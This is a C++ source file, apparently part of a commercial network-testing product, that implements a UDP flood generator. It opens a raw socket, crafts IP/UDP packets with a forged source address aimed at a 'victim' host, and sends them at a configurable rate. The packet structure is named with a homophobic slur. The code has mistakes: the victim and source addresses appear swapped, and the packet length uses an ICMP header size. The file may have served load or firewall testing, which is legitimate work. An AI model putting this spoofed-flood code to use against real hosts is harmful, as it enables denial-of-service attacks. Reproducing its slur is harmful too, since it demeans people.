////////////////////////////////////////////////////////////////////////////
//
// Copyright (C) 2005
// Packet Engineering, Inc. All rights reserved.
//
// Redistribution and use in source and binary forms, with or without
// modification is not permitted unless authorized in writing by a duly
// appointed officer of Packet Engineering, Inc. or its derivatives
//
// File Name: UdpAttacker.cpp
// Description:
//   
//
// Modification History:
// 
////////////////////////////////////////////////////////////////////////////


#include "AttackMgr/UdpAttacker.h"
#include "AttackMgr/AttackUtil.h"

#include <signal.h>
#include <stdio.h>
#include <netdb.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

AosUdpAttacker::AosUdpAttacker()
{
	mProtocol = AosAttacker::eUdp;
}

AosUdpAttacker::AosUdpAttacker(const OmnIpAddr &sip,
							   const int &sport,
							   const OmnIpAddr &dip,
							   const int &dport,
							   const int &num,
							   const int &interval)
{
	mProtocol = eUdp;
	mSrcIP = sip;	
	mSrcPort = sport;	
	mDstIP = dip;	
	mDstPort = dport;	
	mNumPerSecond = num;// per second
	mCalcIntevel = interval;//ms
	mTimerSec = interval /1000;
	mTimerUSec = interval %1000 *1000;
}

AosUdpAttacker::~AosUdpAttacker()
{
}

bool
AosUdpAttacker::bind()
{
	mRawsock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
	setsockopt (mRawsock, IPPROTO_IP, IP_HDRINCL, "1", sizeof ("1"));
	return true;
}

bool		
AosUdpAttacker::unbind()
{
	return true;
}

bool		
AosUdpAttacker::sendPacket()
{
	u_long victim = mSrcIP.toInt();
	u_long source = mDstIP.toInt();
	u_short port = mDstPort;

	int tmplen;
	int fbi = 1, cia = 9999;
	struct sockaddr_in sin;
	struct
	{
	 struct iphdr ip;
	 struct udphdr udp;
	 //u_char evil[1 + psize];
	 u_char evil[111];    //UDP Len
	} 
	faggot;
	
	int pktsize = sizeof (struct iphdr) + sizeof (struct icmphdr) + 64;
	
	if(fbi++ > 9999)
	fbi = 1;
	if (cia-- < 1)
	cia = 9999;
	
	srandom ((time (NULL) + random ()));
	
	faggot.ip.version = 4;
	faggot.ip.ihl = 5;
	faggot.ip.tos = 0x00;
	faggot.ip.tot_len = htons(pktsize);
	faggot.ip.id = htons (getpid());
	faggot.ip.frag_off = 0;
	faggot.ip.ttl = 255;
	faggot.ip.protocol = IPPROTO_UDP;
	//ih->saddr = k00lip ();
	faggot.ip.saddr = source;
	faggot.ip.daddr = victim;
	faggot.ip.check = AosAttackUtil::ip_sum((u_short *)&faggot.ip, sizeof(faggot.ip));
	
	faggot.udp.source = htons(cia);
	faggot.udp.dest = htons(port);
	faggot.udp.len = htons(sizeof(faggot.udp) + sizeof(faggot.evil));
	
	sin.sin_addr.s_addr = faggot.ip.saddr;
//	printf("From the source %s , ", inet_ntoa(sin.sin_addr));
	
	sin.sin_family = AF_INET;
	//sin.sin_port = htons(0);
	sin.sin_addr.s_addr = faggot.ip.daddr;
	tmplen = sendto (mRawsock, &faggot, sizeof(faggot), 0, (sockaddr *)&sin, sizeof (sin));
//	printf("Send the UDP to victim %s , the content len=%d\n", inet_ntoa(sin.sin_addr), tmplen);
	return true;
}

